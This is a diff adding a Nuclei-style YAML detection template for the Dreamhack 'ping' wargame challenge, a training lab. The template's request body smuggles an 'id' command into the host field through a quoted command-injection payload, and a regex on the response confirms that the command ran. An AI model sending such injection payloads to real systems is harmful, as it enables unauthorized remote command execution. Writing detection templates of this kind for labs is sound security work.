@@ -1,0 +1,31 @@
+# https://dreamhack.io/wargame/challenges/44
+id: dreamhack-ping-ci
+info:
+  name: "Dreamhack Ping Command Injection (id POC with Double Quotes)"
+  author: "Marcos Tolosa"
+  severity: critical 
+  tags: [rce, os-injection, web-server, dreamhack, injections] 
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/ping" 
+
+    headers:
+      "Content-Type": "application/x-www-form-urlencoded"
+
+    body: "host=8.8.8.8\";id\"" 
+
+    matchers-condition: and
+    matchers:
+      # Matcher 1: Verifica o Status Code (garante que a página carregou)
+      - type: status
+        status:
+          - 200
+
+      # Matcher 2: Verifica a saída do comando injetado ('id')
+      # A saída de 'id' é sempre 'uid=XX(nome) gid=YY(nome)...'
+      - type: regex
+        part: body
+        regex:
+          - "uid=\\d+\\(\\w+\\)\\s+gid=\\d+\\(\\w+\\)"
